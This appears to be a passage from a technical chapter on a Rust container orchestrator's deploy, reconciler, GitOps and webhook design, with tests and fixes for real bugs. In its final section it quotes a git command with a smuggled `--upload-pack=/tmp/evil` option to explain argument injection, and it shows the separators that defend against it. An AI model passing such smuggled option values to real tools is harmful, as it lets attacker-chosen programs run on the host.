The second problem is subtler and it bit the ordinary `relish stop` too. The agent sent SIGTERM, then immediately marked the instance `Stopped` and moved on. But SIGTERM is a *request*. A process can take a moment to flush and exit, or ignore the signal entirely. Recording `Stopped` before the process is gone lets two sources of truth drift apart: the supervisor says "stopped", the container says "still running, still serving". That divergence is exactly the kind of lie that makes an orchestrator untrustworthy.

The fix is to wait for the exit and escalate if it doesn't come:

```rust
async fn stop_and_wait_for_exit(&self, id: &InstanceId, grace: Duration) {
    let _ = self.supervisor.grill().stop(id).await;   // SIGTERM
    let deadline = Instant::now() + grace;
    while Instant::now() < deadline {
        if matches!(self.supervisor.grill().state(id).await, Ok(ContainerState::Stopped)) {
            return;                                     // clean exit
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    if !matches!(self.supervisor.grill().state(id).await, Ok(ContainerState::Stopped)) {
        let _ = self.supervisor.grill().kill(id).await; // SIGKILL
    }
}
```

SIGTERM, poll for the exit up to a grace period, then SIGKILL whatever's left. The `shutdown_all` path had this pattern already; now the ordinary stop and the rolling retire share it. Only once the runtime confirms the exit does the supervisor record `Stopped`. Container state and supervisor state can't diverge, because we don't write the second one down until the first one is true.

Well, almost. Look at the last line of that listing: `let _ =` throws away the result of `kill`, and nothing checks that SIGKILL actually worked. We come back to that hole in "A deploy owns what it starts" below.

The tests pin all three behaviours honestly. One holds an in-flight request open through the live proxy and asserts the drain doesn't complete until the request returns. One drives a rolling redeploy and asserts the new instance's `start` lands before the old instance's `stop` — surge-first, availability preserved. And one makes the mock runtime ignore SIGTERM, then asserts the stop escalates to `kill` rather than lying that the app is down.

## What we learned

### An abstraction has to fit its runtime

The CLAUDE.md says "Don't write a trait until you have two implementations." The `DeployDriver` trait followed the letter of that rule (a mock and a production driver) and broke its spirit: the production driver was always "eventually", and when the agent turned out to be async it never arrived. A trait with one live implementation is a model, and a model that the production code doesn't run drifts. We'd rather have one deploy path with a pure planner in the middle than two that might disagree.

### Drain errors are non-fatal for a reason

The first version treated drain failures as deploy errors. A deploy would fail because one in-flight request didn't finish before the 10-second drain timeout. The operator would see "deploy failed", panic, check the logs, find nothing wrong, and re-deploy. Same thing would happen again if a slow request was in flight.

Making drain non-fatal was a one-character change (`?` to `let _ =`). It fixed the false-failure problem completely. Sometimes the right abstraction is less error handling, not more.

### Rollback uses the same planner, backwards

We considered a separate rollback procedure. Then we realised rollback is a rollout in reverse: the previous spec is the "new" version, the healthy replacements are the "old" instances, and `plan_rolling_step` decides the order within the same surge and unavailable budget. One planner, two directions, no second set of rules to keep in step.

## Tests

We wrote the tests before the code, as the roadmap demands, and they fall into three layers.

### Planner and transition tests: the rules in isolation

`plan_rolling_step` and the phase transitions are pure: feed them numbers or an event, check the answer. No I/O, no async, no mocks. So `src/meat/deploy_types.rs` holds one small test per rule, named as sentences:

```rust
#[test]
fn step_failed_with_auto_rollback_goes_to_reverting() { ... }

#[test]
fn surge_exhausted_by_pending_instances_waits() { ... }
```

Every valid transition gets a test, and so do the forks that depend on config (`auto_rollback` on versus off). Because the `match` is exhaustive, we don't need a test for "what happens on an undefined transition" beyond one check that it returns `DeployError::InvalidTransition`. The planner tests walk whole rollouts (`default_surge_keeps_one_spare_and_never_dips`, `zero_surge_replaces_in_place`, `extra_old_instances_are_retired`) and the one combination validation must refuse (`both_bounds_zero_is_stuck_and_rejected_by_validation`). In `src/bun/agent/deploy_ops.rs`, `deploy_history_keeps_the_newest_fifty_entries_per_app` records 120 deploys of one app and checks the window holds the newest fifty without pushing out another app's entries.

### Agent tests: the real worker, a fake runtime

`src/bun/agent/tests/` drives the real deploy worker against `MockGrill`: `rolling_redeploy_completes_when_the_probe_passes`, `rolling_redeploy_rolls_back_when_the_probe_fails`, `rolling_redeploy_halts_without_reverting_when_auto_rollback_is_false`, `rolling_redeploy_honours_max_surge` and `rolling_redeploy_honours_zero_surge`. These run in milliseconds too, because no container is ever started, and they test the code that ships, not a model of it.

### Integration tests: the real agent

`tests/integration.rs` exercises the agent end to end with a real (process-backed) runtime: `deploy_app_reaches_running`, `health_check_failing_app_never_reaches_running`, `job_runs_to_completion`, `job_failed_retries_then_fails`, `init_container_success_allows_app_start`, and `init_container_failure_prevents_start`. These are slower (they spin up the agent and poll real state) but they prove the wiring the fake runtime can't.

### Running them

Everything in this chapter runs under a plain:

```sh
cargo test
```

There are no gated tests here: no eBPF, no root, no network, no platform-specific runtime. (Those arrive in the networking, registry, and chaos chapters.) To run just this chapter's suites:

```sh
cargo test --lib meat::deploy_types     # planner and transition tests
cargo test --lib bun::agent::tests      # the deploy worker against MockGrill
cargo test --test integration           # full agent lifecycle
```

A failing planner or transition test names the exact rule that broke (`step_failed_without_auto_rollback_goes_to_halted`), which tells you which `match` arm regressed without reading a stack trace.

## Applied means done, not queued

The per-node reconciler (Chapter 2) is what actually converges a node onto the leader's plan: it polls `GET /v1/placements/{node}`, and for any app whose assignment appeared or changed, it hands the agent a `Deploy` command. To avoid re-deploying the same thing every two seconds, it remembers what it last applied in a small map: `(name, namespace) → fingerprint`, where the fingerprint is the serialised spec. Same fingerprint next tick? Skip it.

Two things were wrong with that map, and they're the kind of wrong that only bites in production.

First, "applied" meant "I put the command on the queue", not "the deploy succeeded". The reconciler marked the fingerprint applied the instant the channel `send` returned `Ok` — before a single container started, before any health check passed. A deploy that failed *after* acceptance (bad image, port clash, a crash on start) was recorded as done and never retried. The node sat there convinced it had converged onto an app that wasn't running.

The fix is to wait for the deploy's *terminal* outcome. The agent already streams `ApplyEvent`s back over a channel — `Progress`, then a final `Complete` or `Error`. So instead of draining and discarding those events, the reconciler now reads them to the end and only records the fingerprint on `Complete`:

```rust
async fn deploy_succeeded(mut events: mpsc::Receiver<ApplyEvent>) -> bool {
    while let Some(event) = events.recv().await {
        match event {
            ApplyEvent::Complete { .. } => return true,
            ApplyEvent::Error { .. } => return false,
            _ => {}
        }
    }
    false
}
```

If the deploy fails, `applied` is left untouched, so the next tick retries it. "Applied" now means what it says.

That `bool` had a cost we only noticed while chasing a flaky test. A Runc init container kept failing its first deploy, and all a node's log said was that it had retried. The agent's `Error` event said which init container failed, but the `ApplyEvent::Error { .. }` pattern threw the message away (`..` means "ignore the remaining fields"). Even the agent's message was thin: "init container 0 failed". The real reason, `runc run failed: container's cgroup is not empty`, sat in a file on disk that nobody read.

So the function became `deploy_outcome`, and it returns a `Result` whose error says why:

```rust
enum DeployWaitError {
    Failed(String),      // the agent's own message
    Closed,              // the stream ended without an outcome
    TimedOut(Duration),  // no terminal event in time
}
```

The reconciler logs that error before it retries. At the other end, when an init container fails the agent reads the last 400 bytes of what the runtime wrote to its stderr and appends them to the failure, next to the exit code. It reads a tail with a seek rather than the whole file, because an init container that dumps megabytes of output and then fails shouldn't get megabytes into a log line. Now the node's log says `init container 0 failed for instance default__web-0: exited with code 1: runc run failed: container's cgroup is not empty: 1 process(es) found`, and you know where to look.

Second, the map lived only in memory. Restart bun — a crash, a self-upgrade — and it forgot everything it had applied. On the next tick it would re-deploy *every* assigned app from scratch, even ones already happily running, churning containers for no reason. So the applied map is now durable: a tiny JSON checkpoint written atomically (temp file, then rename, so a crash mid-write can't leave a torn file) and reloaded on boot. A restarted reconciler picks up where it left off. A missing checkpoint loads empty. A corrupt or unreadable one refuses to reconcile, because treating it as empty would forget apps this node still runs. The checkpoint is self-describing JSON with a `schema` field, so a future format change fails loudly instead of mis-parsing an old file into nonsense.

Put the two fixes together and the restart story is nearly correct. The remaining gap: a worker receives `api`, starts a container and dies before recording success. While it's down, you remove `api`. On restart the checkpoint has no entry for it, so nothing ever retires that container. It has fallen between two records. So each entry is now one of two states:

```rust
pub enum AssignmentState {
    /// Ownership is durable, but deployment has not been confirmed.
    Pending,
    /// The assignment completed successfully at this serialised specification.
    Applied { fingerprint: String },
}
```

Rust enum variants can carry data: `Pending` carries nothing, `Applied { fingerprint }` carries a string, a bit like a tagged union in C where the compiler checks the tag for you. The reconciler writes `Pending` *before* it queues the `Deploy` command and upgrades it to `Applied` only on `Complete`. Both states mean "this node owns resources for the app", so a withdrawn assignment in either state needs a confirmed retirement before its entry disappears. A restarted bun now neither double-deploys converged work nor forgets an interrupted deploy.

The release soak found one more way to fall between the two records, and it needed nobody to crash mid-deploy. The harness restarts bun on all three nodes, one after another. While that happens the leader briefly gives up on node 2 and takes its `frontend` replica away, then hands the very same assignment back a few seconds later. In between, node 2 starts retiring the replica. The stop succeeds. Freeing its address doesn't, not yet: that waits until every other node confirms it has stopped routing there, and the other nodes are busy restarting. So the retirement fails with "will retry", the entry stays `Applied`, and on the next tick the assignment is back with an identical fingerprint. Same fingerprint? Skip it. The replica stayed stopped for good, and `frontend` ran two of its three replicas until the harness gave up ten minutes later. The leader wasn't wrong, either: it had placed the replica on a live node, so it had no reason to place it anywhere else. The fix is one rule: a retirement that doesn't finish drops the entry back to `Pending`. That keeps ownership, so the retirement is retried if the assignment stays gone, and it stops claiming convergence, so a returning assignment gets deployed. The agent's rolling path already turns a stopped replica into a fresh running one. `a_placement_returning_after_a_failed_retirement_is_deployed_again` plays the leader's withdraw-and-return against a stand-in agent whose retirement answers "other nodes have not yet confirmed". Before the fix, it saw the same single "will retry" line the soak journal shows, followed by silence.

## Stopping an app is a decision, not a signal

Stopping an app in a cluster used to be a local affair. `POST /v1/stop/{app}/{namespace}` sent the receiving node's agent a `Stop` command, that node killed its local replicas, and the handler returned. Done — except it wasn't.

The app is *desired state* in Raft. The scheduler places it because the council says it should exist. Kill the local containers and leave the desired state alone, and the very next reconcile tick sees an app that's supposed to be running and isn't, and helpfully deploys it again. You can't stop an app by fighting the reconciler; you have to change its mind. And there's a second failure: ask the *leader* to stop an app it holds no replica of, and the old handler returned a 404 — "no such app here" — even though the app plainly existed cluster-wide.

Both symptoms have one cause: stop wasn't going through Raft. Now it does. In cluster mode, `stop` proposes an `AppDelete` request to the council, exactly the way `apply` proposes an `AppSpec`. The desired state clears, the scheduler stops placing the app, and no reconciler resurrects it. The local container stop becomes best-effort cleanup that runs *after* the delete commits — and because a missing local replica is expected on a leader that holds none, it's no longer an error. Followers can't write to Raft (openraft doesn't forward client writes), so a stop received on a follower forwards to the leader's API, the same leader-forwarding dance `apply` already does. A gated three-node test proves the whole loop: deploy an app, stop it through any node, and watch the desired state clear and *stay* clear across several reconcile ticks.

One thing the handler still got wrong was its answer. Once the Raft write committed it replied `200 OK` with `{"status": "stopped"}`, and `relish` printed `stopped web`. But a commit only records a decision. The workers haven't heard about it yet, and one of them might be unreachable for the next hour (an audit reproduced exactly that, #435). Claiming the app had stopped was a guess. HTTP has a status code for this situation: `202 Accepted` means "I've taken your request, and the work happens later". So a clustered stop now answers `202` with `stopping`, a delete answers `202` with `deleting`, and `relish` says `stop requested for web` and points at `relish status`. Every caller that only checks for success (the CLI, the test runner, the soak harness) carries on unchanged, because `202` is a success. The callers that need the instances gone already poll for that. A standalone node keeps `200` with `stopped`, since there the handler waits for the local stop to finish before it answers.

## A slow deploy shouldn't freeze the node

Here's a bug you only notice under load. The Bun agent runs one central task, its command loop. A `select!` block waits on several things at once: incoming commands, a health-check timer that fires every second, snapshot requests from the cluster, and a shutdown signal. Whichever fires first wins; the loop handles it, then goes back to waiting. Simple, and for most commands it's fine, because most commands are fast.

Deploy is not fast. Pulling an image can take tens of seconds. Init containers run to completion before the main container starts. A rolling redeploy waits for each new replica to report healthy before it retires an old one. And all of that used to run *inside* the command loop, because `handle_command` awaited the whole `deploy` call before returning to the `select!`.

Think about what that means. While one app is pulling a 400MB image, the health-check timer is firing into a loop that can't answer it. Another app goes unhealthy and needs a restart? It waits. A `relish status` call? It waits. A second `apply`? It queues behind the first and can't even *start* until the pull finishes. One slow deploy freezes the whole node. On a busy cluster, that's the difference between a deploy and an outage.

The fix is to get the blocking work off the loop. Each deploy now runs on its own spawned task:

```rust
let worker = DeployWorker {
    grill: self.supervisor.grill().clone(),
    ops: DeployOps { tx: self.deploy_ops_tx.clone() },
};
tokio::spawn(async move {
    worker.run_deploy(config, forward_tx).await;
});
```

`tokio::spawn` hands a future to the runtime to run concurrently, the way you'd start a goroutine in Go or a thread in C — except it's cooperative, not pre-emptive, so it only ever yields at an `.await`. The command loop spawns the worker and returns to its `select!` immediately. The image pull now happens on the worker's task, and while it's parked at that `.await`, the loop is free to answer health checks, restarts, status, and further deploys. Two deploys for different apps land at once? Two tasks, both making progress. A second deploy for the same namespace/name is refused before either worker can race the same supervisor rows.

Spawning fixed responsiveness but created another observability problem: the SSE
stream used to be the only place an in-flight deploy existed. Close your terminal
and the evidence vanished. Now the agent registers a `DeployOperation` before it
spawns the worker. The first standalone SSE item is `Accepted { operation_id }`;
the worker advances the shared record through app, job and route-rebuild phases,
including its current target. `GET /v1/deploys/active` reads those records and
`GET /v1/deploys/operations` adds the newest fifty terminal results.

The forwarding task keeps consuming worker events even after the client drops.
`Complete` records `completed`, `Error` records `failed`, and a channel which
closes without either records `unknown`. Why not assume the worker succeeded?
Because absence of evidence is the exact condition diagnostics need to flag.
The operation history is local runtime evidence; the per-app spec history used
by rollback is a different structure, and the library-side `DeployState` model
doesn't magically become the binary's execution path just because both contain
the word “deploy”.

But here's the catch, and it's the whole design problem. The blocking I/O — `grill.create`, `grill.start`, the init and health polls — can move to the worker, because the grill and the port allocator are cheap to clone (both wrap their real state in an `Arc`, so a clone shares it). The *supervisor state machine* cannot. There is exactly one supervisor, it lives on the command loop behind `&mut self`, and it must stay that way: it's the single source of truth for which instances exist and what state each is in. Health checks read it. Crash restarts mutate it. If a deploy task held its own copy, the two would drift, and drift in a state machine is how you get an instance the health checker thinks is running and the supervisor thinks was never born.

So we split the work by who's allowed to touch what. The worker owns the slow grill I/O. Every state transition, every supervisor mutation, every service-map and networking change travels back to the loop as a message:

```rust
enum DeployOp {
    PrepareFreshInstance { /* … */ reply: oneshot::Sender<Result<PreparedInstance, BunError>> },
    ApplyEgressPreStart  { /* … */ reply: oneshot::Sender<Result<(), BunError>> },
    TransitionState      { instance_id: InstanceId, to: ContainerState,
                           reply: oneshot::Sender<Result<(), BunError>> },
    FinishFreshInstance  { /* … */ reply: oneshot::Sender<Result<(), BunError>> },
    // … one variant per authoritative step
}
```

Each variant carries its arguments and a `oneshot::Sender` — a single-use channel the loop replies down. The worker sends an op, awaits the reply, and drives on. The loop drains these ops in a new `select!` arm, right next to the command and health-check arms, and dispatches each to the same `&mut self` method the old serial code called. No logic moved; only *where it runs* changed.

Trace a fresh instance and you can see the two halves take turns:

```rust
// worker (off the loop)                    // loop (owns the supervisor)
let prepared = self.ops
    .prepare_fresh_instance(…).await?;   // → Preparing, build OCI spec, decrypt secrets
self.grill.create(…).await?;             // the image pull — off the loop
self.ops.apply_egress_pre_start(…).await?; // → program egress before anything runs (#86)
// … init containers, polled here …
self.ops.transition_state(…, Starting).await?;
self.grill.start(…).await?;              // start — off the loop
let ip = self.grill.container_ip(…).await;
self.ops.finish_fresh_instance(…, ip).await?; // → HealthWait, register backend, networking
```

The worker sequences the deploy; the loop applies each authoritative step and stays free between them. Because the loop processes deploy ops in the *same* `select!` as health checks, a slow pull on one app never delays a health transition on another — the pull is parked on a task, and the loop is doing other work. That ordering — create, *then* program egress, *then* start — is exactly the pre-start networking sequence from Chapter 3, preserved to the letter: a replacement replica must never run ahead of its egress policy, off-loop or not.

Two tests pin the behaviour down. The first deploys an app whose `create` sleeps for three seconds, then fires a `Status` command and asserts it's answered in well under that — proof the loop kept moving. The second starts two deploys whose creates both sleep, and checks that *both* creates are in flight before either finishes; serially, the second couldn't start until the first returned. Both tests fail against the old inline deploy and pass against the task-per-deploy one, which is exactly what you want a regression test to do.

## One config, two front doors, one path

A Reliaburger config file describes more than apps. It can declare namespaces (with resource budgets), permissions (who can do what), jobs, and image builds — all in the same TOML. Apps, namespaces and permissions have two routes into desired state: manual `relish apply` and the Lettuce GitOps engine. Manual apply additionally executes jobs. GitOps refuses a tree containing any job before it writes desired state; sharing the configuration format does not give Lettuce a job execution path.

Here's the question that keeps you up at night: do those two doors lead to the same room? If `relish apply` writes an app but silently drops the namespace, while GitOps writes the namespace but mangles the app's identity, then "declarative" is a lie. The cluster's state depends on *how* you applied the config, not *what's in it*. That's the worst kind of bug, because it only shows up when someone switches from one door to the other and wonders why their quota vanished.

For a long time, that was exactly the situation. Manual apply proposed an `AppSpec` for each app and dropped everything else on the floor. GitOps had its own translation step, `resource_change_to_request`, which returned `None` for anything that wasn't an app — jobs, namespaces, permissions, all silently skipped. Two code paths, two sets of blind spots, and no reason to think they'd ever agree.

The fix is structural, not a patch. We wrote one function, `config_to_desired_writes`, that turns a parsed `Config` into the ordered list of Raft writes it implies:

```rust
pub fn config_to_desired_writes(config: &Config) -> Vec<RaftRequest> {
    let mut writes = Vec::new();
    for (name, spec) in &config.namespace {
        writes.push(RaftRequest::NamespaceSpec { name: name.clone(), spec: Box::new(spec.clone()) });
    }
    for (name, spec) in &config.permission {
        writes.push(RaftRequest::PermissionSpec { name: name.clone(), spec: Box::new(spec.clone()) });
    }
    for (name, spec) in &config.app {
        let namespace = spec.namespace.clone().unwrap_or_else(|| "default".into());
        writes.push(RaftRequest::AppSpec { app_id: AppId::new(name, &namespace), spec: Box::new(spec.clone()) });
    }
    writes
}
```

`Box<T>` here is Rust's heap pointer — the same idea as a C `malloc`'d struct behind a pointer, but the compiler frees it for you when the `Box` goes out of scope. We box the specs because `RaftRequest` is an enum, and an enum is as big as its largest variant; boxing the big payloads keeps the whole enum small to move around. `Vec<T>` is a growable array, like Go's slice or C++'s `std::vector`.

Now both front doors call this one function. Manual apply loops over its output and writes each request. GitOps, after diffing the repo against the current state, maps each change through the *same* request shapes. There's no second translation that could drift, because there's no second translation. Notice the ordering, too: namespaces first, then permissions, then apps. A namespace's quota has to be committed before an app schedules against it, or the app's first placement races the budget that's meant to constrain it.

How do you *prove* the two doors agree? You write the test that would have caught the old divergence:

```rust
#[tokio::test]
async fn manual_apply_and_gitops_converge_identically() {
    // Apply the every-kind config by hand to one council…
    for request in config_to_desired_writes(&config) {
        manual.write(request).await.unwrap();
    }
    let manual_state = declarative_json(&manual.desired_state().await);
    // …and sync the identical file through GitOps to another.
    // Then assert the declarative desired state is byte-identical.
}
```

The first time we ran it, it failed — and it failed for a *real* reason. Manual apply keyed an app on its declared namespace (`prod/web`), but the GitOps path hardcoded `default` when it built the app's identity. Same config, two different `AppId`s, two different rooms. The shared write function fixed the manual side; the GitOps translation had to learn to read the app's own namespace instead of assuming `default`. That's the whole point of an acceptance test written against the property you care about: it doesn't care *how* the paths differ, only *that* they agree, so it catches drift you didn't think to look for.

## Why "applied" must mean "all of it applied"

GitOps has a second failure mode that's subtler and nastier. A sync isn't one write; it's a batch. A single commit might add a namespace, update a permission, and create three apps. What happens if the second write fails?

The old runner applied each change in a loop, logged failures, and then — regardless of what failed — recorded the commit as applied:

```rust
// old: apply each change, then unconditionally advance the commit
for change in &outcome.changes {
    if let Err(e) = council.write(request).await { eprintln!("failed: {e}"); }
}
sync_state.last_applied_commit = Some(commit);   // ← runs even after a failure
```

Read that again, because it's the bug. `last_applied_commit` is how GitOps knows what it's already done. On the next tick, it fetches the repo, sees the commit hasn't changed, and skips — "already applied, nothing to do." So if a write failed but the commit advanced anyway, that failed resource is now *permanently* missing. It won't retry, because as far as the runner knows, it's done. The namespace you committed just quietly doesn't exist, and nothing ever tries again until some *unrelated* future commit happens to touch the repo.

The fix is a rule you can state in one sentence: the commit advances only if every write in the sync succeeds.

```rust
async fn apply_changes(council: &CouncilNode, changes: &[ResourceChange]) -> Result<usize, String> {
    let mut applied = 0;
    for change in changes {
        let Some(request) = change_to_request(change) else { continue };
        match council.write(request).await {
            Ok(CouncilResponse::Refused { .. }) | Err(_) => {
                return Err(change_id(change).to_string());   // stop; don't advance
            }
            Ok(_) => {}
        }
        applied += 1;
    }
    Ok(applied)
}
```

`Result<usize, String>` is Rust's answer to error handling — a value that's *either* an `Ok` carrying the count, *or* an `Err` carrying the id of the change that failed. There's no exception to forget to catch and no error code to ignore; the caller can't get at the count without acknowledging the failure case. The `let Some(x) = … else { continue }` is a *let-else*: bind `x` if the pattern matches, otherwise run the `else` (which must diverge — here, `continue` to the next change). It's the clean way to say "skip the ones that don't map to a write" without nesting.

(Stopping at the first failure turned out to be too strict: one bad app blocked every change behind it. "GitOps owns what it wrote" below shows how `apply_changes` now tries every change and reports each refusal, while keeping the rule that follows.)

The caller advances `last_applied_commit` only on `Ok`. On `Err`, it leaves the commit untouched and moves on; the next tick sees an unapplied commit and re-runs the whole set. That only works because the writes are idempotent — applying a `NamespaceSpec` that's already there is an upsert, a harmless no-op — so re-running a partially-applied sync converges instead of double-counting. Idempotence is what buys you "just retry the whole thing," which is the simplest correct recovery there is.

The test for this drives `apply_changes` against a council that was never made leader, so every write is refused. The function must stop at the first failure and report *which* change failed, and the app must never reach desired state. Run it against the old code and the commit advances over a wholesale failure; run it against the new code and the failure surfaces, the commit holds, and the next tick gets another go.

The first version of this fix only checked the outer `Err`, and a static review (B15) caught what that misses. `council.write` returns `Result<CouncilResponse, CouncilError>`, and `Err` only means Raft didn't commit the entry. An entry can commit and still be *refused*: the state machine applies it in log order, decides it isn't allowed, and answers `Ok(CouncilResponse::Refused { reason })` with desired state untouched. An app in an `rbtest-*` namespace is one, since only a leased test write may create those. That `Ok` counted as applied, and the commit advanced past a change that never happened. The `match` above names the refusal next to the transport error, so both stop the sync. The pattern `A | B` in one arm matches either shape, and `Ok(_)` after it catches every other response. The test drives `apply_changes` on a real leader with an `rbtest-lease/web` app and expects the refusal to come back as that resource's id.

## Validating with the right namespace context

A permission file can refer to `prod` after an earlier apply created that namespace. The CLI only has the new file, so a validation pass that insists on seeing `[namespace.prod]` there rejects a valid request. Adding the declaration to satisfy the CLI can replace the namespace's existing quota. The server had the right `validate_against` method, but its earlier validation pass rejected the request before that method ran.

We now share the field checks and make the available context explicit. `validate_intrinsic` checks names, resource values, workload specifications, permission actions and build destination syntax. It leaves permission/build namespace existence for live admission. `validate_against` passes the union of inline declarations and committed namespaces to the same checks; offline `validate` uses only inline declarations.

The helper takes `Option<&[String]>`. `None` means the caller has no authoritative namespace catalogue yet; `Some` supplies a borrowed slice, so validation reads the catalogue without owning or copying it. The CLI's apply and deploy paths use the intrinsic pass. A cluster API repeats it, forwards the original credential if needed, and the leader performs the context check before any desired-state write. Standalone admission and offline lint still use full validation.

A build-only apply also reaches the leader for validation, although build execution remains the separate build route. The regressions use the actual HTTP client against a leader and a three-council follower: existing references succeed without replacing the stored quota, and ghost references fail without adding a permission or app. They also check both permission and build manifest loading locally.

## The namespace bug that got away

We fixed the identity mismatch on the *write* side and celebrated. Then someone deleted an app from git and watched the wrong one disappear.

Here's what we missed. The diff engine compares the repo against the current state to work out what changed, and to find *removals* it asks "which apps are in Raft but not in git?" The trouble was how it answered. It keyed everything on the bare app name:

```rust
let current_by_name: BTreeMap<String, _> =
    current.apps.iter().map(|(id, spec)| (id.name.clone(), (id, spec))).collect();
```

Drop `id.namespace` on the floor and `prod/web` and `default/web` collapse into one key, `web`. So when git stopped mentioning `prod/web`, the diff couldn't tell which `web` to remove, and a removal aimed at `prod` could take out `default` instead. We'd fixed the door the app *walks in* through and left the door it *leaves* by broken.

The fix is to diff on the whole identity, never the name alone. Git apps get keyed by the same `AppId` the write path builds:

```rust
let git_apps: BTreeMap<AppId, &AppSpec> = git_config
    .app
    .iter()
    .map(|(name, spec)| (app_id_for(name, spec), spec))
    .collect();

for app_id in current.apps.keys() {
    if !git_apps.contains_key(app_id) {
        changes.push(ResourceChange::Remove { resource_id: app_resource_id(app_id) });
    }
}
```

And the `resource_id` a change carries now spells out the full identity — `app.prod/web`, not `app.web` — so by the time the runner turns it into an `AppDelete`, there's no namespace left to guess. `app_resource_id` and `parse_app_resource_id` are exact inverses; encode an `AppId`, parse it back, get the same `AppId`. The test seeds two same-named apps in different namespaces, drops one from git, and checks that exactly the right one is reconciled away while its twin is left alone.

While we were in there, we killed a related zombie. Jobs were being compared against a set that was *always empty*:

```rust
let current_job_names: BTreeSet<&String> = BTreeSet::new();  // never filled
for name in git_config.job.keys() {
    if !current_job_names.contains(name) { /* always true → always "Add" */ }
}
```

Every sync re-declared every job as new. But jobs run to completion; they aren't reconciled desired state, and there's no job map in Raft to compare against. So the applier quietly dropped these phantom "Adds" while the summary counted them anyway — every sync claimed it added jobs it never wrote. The honest fix is to emit nothing for jobs at all. A job that's present in git is dispatched by the one-shot deploy path; one that's absent was never desired state to re-add. Silence is the correct diff.

## A webhook the whole internet can reach

Polling git every thirty seconds works, but it's slow and wasteful. Every git host will happily *tell* you the moment something changes, if you give it a URL to POST to. So Lettuce exposes one: `POST /v1/gitops/webhook`. Push to the repo, GitHub fires the hook, and the sync runs in the second it takes to deliver, not on the next poll.

There's an obvious problem. Every other route on the agent sits behind a bearer token — you prove who you are, or you get a 401. But GitHub has never heard of your bearer token and never will. It authenticates *its* way: an HMAC-SHA256 signature over the request body, in an `X-Hub-Signature-256` header, computed with a secret you configured on both ends. GitLab does its own thing (`X-Gitlab-Token`, the shared secret sent verbatim). Neither will send a Reliaburger token, so a route that demands one is a route no git host can call.

So the webhook has to be *public* — exempt from the bearer-auth middleware — and yet it can't be *open*, because an unauthenticated "make the cluster sync now" button is a denial-of-service lever anyone on the internet can lean on. The resolution is to move the authentication *into the handler*. The router puts the route on the public side of the split, alongside health and the join endpoint:

```rust
let public = Router::new()
    .route("/v1/health", get(health_handler))
    .route("/v1/cluster/join", post(join_handler))
    .route("/v1/gitops/webhook", post(gitops_webhook_handler))  // public, but HMAC-gated
    .with_state(state.clone());
```

and the handler does the checking itself, over the raw bytes of the body, before it nudges anything:

```rust
// After reserving standalone queue capacity, or selecting the cluster leader:
let mut guard = validator.lock().await;
let admission = guard.reserve(
    &body, signature, gitlab_token, delivery_id, &branch,
)?;

// The standalone handler consumes its reserved channel permit. On the
// cluster leader, admission must be replicated before the HTTP 202:
let receipt = Sha256::digest(delivery_id.unwrap().as_bytes());
let response = council.write(RaftRequest::GitOpsSyncRequested {
    delivery: receipt.into(),
}).await?;
if let CouncilResponse::GitOpsSyncRequested { generation } = response {
    admission.commit();
    let _ = tx.try_send(()); // wakeup only; the committed generation owns the work
    return (StatusCode::ACCEPTED, Json(serde_json::json!({
        "message": "sync admitted", "generation": generation,
    }))).into_response();
}
// Dropping an uncommitted admission restores the replay and rate reservation.

```

Three checks, in order. The signature must verify against the configured secret — `ring::hmac::verify` does this in constant time, so a wrong signature leaks nothing about how close it was. The delivery id must be one we haven't seen, or a replayed POST (the same signed body, captured and re-sent) would trigger a fresh sync every time. And the request must fit under a rate limit, so a flood of valid hooks can't hammer the sync loop. Only when all three pass can the handler admit the delivery. A standalone API consumes its reserved queue slot. A cluster follower forwards the original authenticated request to the leader; the leader commits a trigger generation through Raft before returning 202 and waking its runner.

Two design choices are worth pausing on. First, **fail closed**: if no `[gitops] webhook_secret` is configured, there's no validator, and the handler returns 503 rather than triggering an unauthenticated sync. A public route with no way to authenticate the caller is worse than no route at all. Second, the validator is `Arc<Mutex<WebhookValidator>>` — shared and *mutable*, because the replay set and the rate-limit window are state that changes on every request. `Mutex` here isn't guarding against data races in the C sense; it's making sure two hooks arriving at once can't both slip past the "have I seen this delivery id?" check. Rust's type system won't let you mutate shared state without saying how you're synchronising it, so the `Mutex` is the compiler asking you to be explicit, and the right answer.

The tests exercise the whole contract with no bearer token in sight: a bad signature is a 401 and triggers no sync (observed by an empty channel), a missing signature is a 401, a replayed delivery id is a 401 the second time, a rate-limit flood is a 429, and a correctly-signed GitHub-shaped POST is a 202 that nudges the standalone channel or commits a cluster trigger. Cluster tests send the signed body through a follower, replace the leader before its run starts, and check that the accepted generation and replay receipt survive the handover.

This admission changes both the wire and durable-state formats. The new Council request is also stored in the Raft log; an older binary cannot decode it. Defaulting absent JSON fields does not make an old reader preserve pending generations or receipts. We increment both compatibility generations when this change joins the release train. Before 1.0 we do not migrate these logs or snapshots: start a fresh cluster with the same new binary on every node and re-apply the repository.

## Refuses to be tricked by a filename

Lettuce shells out to `git`. That's a deliberate choice — the `git` binary is always on the node, and it beats pulling in a large C library — but shelling out to a tool that takes both options and arguments on one line has a classic hazard. What if a branch name, a path, or a commit SHA begins with a dash?

```
git log -1 --format=... --upload-pack=/tmp/evil
```

If that `--upload-pack=…` came from a value you thought was a commit SHA, you've just handed `git` an option it will cheerfully obey. The repo URL, the branch, the path prefix, the SHA — several of these are ultimately attacker-influenceable, and none of them should ever be read as a flag.

Git gives you two separators for exactly this. `--` says "everything after me is a pathspec, not an option." `--end-of-options` (git 2.24+) says "stop parsing options, but still treat what follows as revisions." They're not interchangeable: a commit SHA passed after `--` is read as a *filename*, which is wrong, so revision-carrying commands (`log`, `rev-parse`, `ls-tree`, `show`) get `--end-of-options`, while the pathspec on `fetch` gets `--`.

```rust
Command::new("git")
    .args(["log", "-1", "--format=%H%n%s%n%an%n%ct", "--end-of-options"])
    .arg(sha)   // even if it starts with '-', it's a revision now, not a flag
```

One subtlety cost us a test. `git rev-parse --end-of-options HEAD` *echoes the separator back* into its output, because rev-parse prints any token it can't resolve as a revision. Add `--verify` and it prints only the resolved SHA — or fails cleanly — which is what we wanted anyway. The test feeds a leading-dash "SHA" and a leading-dash path into the real functions and asserts they resolve to nothing rather than executing an option. Nothing dramatic happens, which is exactly the success condition.

